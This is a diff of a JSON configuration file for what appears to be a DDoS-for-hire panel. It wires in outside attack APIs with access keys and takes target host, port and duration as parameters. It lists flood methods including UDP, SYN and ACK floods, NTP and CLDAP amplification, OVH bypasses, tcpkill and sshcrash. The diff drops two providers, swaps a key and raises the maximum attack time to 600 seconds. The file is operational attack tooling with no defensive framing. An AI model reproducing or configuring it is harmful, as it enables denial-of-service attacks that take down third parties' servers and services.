@@ -1,26 +1,10 @@
 {
-    "Gucci API": {
+    "API_Name": {
         "api_toggle": "true",
-        "api_url": "https://gucciapi.com/api/attack.php?key=pCy4KQ2hVV6s&host=[HOST]&port=[PORT]&duration=[TIME]&method=![METHOD]",
-        "api_maxtime": "200",
+        "api_url": "https://gucciapi.com/api/attack.php?key=iUlVEXgbLDgO&host=[HOST]&port=[PORT]&duration=[TIME]&method=![METHOD]",
+        "api_maxtime": "600",
         "api_maxconn": "3",
         "api_methods": "udpflood,stdhex,vseflood,synflood,ackflood,tcpbypass,udppps,stdpps,https,tcpkill,sshcrash",
-        "api_funnels": ""
-    },
-    "Hitora API": {
-        "api_toggle": "true",
-        "api_url": "https://hitora.solutions/api/api.php?key=jHbXsgnc75mLZ4TE&vip=0&host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]",
-        "api_maxtime": "600",
-        "api_maxconn": "3",
-        "api_methods": "HOME,TCP-ACID,OVH-BLITZ,UDP-GAME",
-        "api_funnels": ""
-    },
-    "Vortex API": {
-        "api_toggle": "true",
-        "api_url": "https://api.vortex-api.com/api?key=v-w6oJiucw&host=[HOST]&port=[HOST]&time=[TIME]&method=[METHOD]",
-        "api_maxtime": "600",
-        "api_maxconn": "3",
-        "api_methods": "HOME,UDP-MINI,OVH-CPU,CLDAP,HTTP-BROWSER,UDP,UDP-GAME,OVH-UDP,TCP-GOD,DVR,SOCKET,UAM-POST,TCP-SKY,TCP-OPT,UAM,GET,NTP,WSD,ARD,SNMP,UDP-MINI,TCP-SACK,TCP-ACK,TCP-VORTEX,TCP-VALID",
         "api_funnels": ""
     }
 }
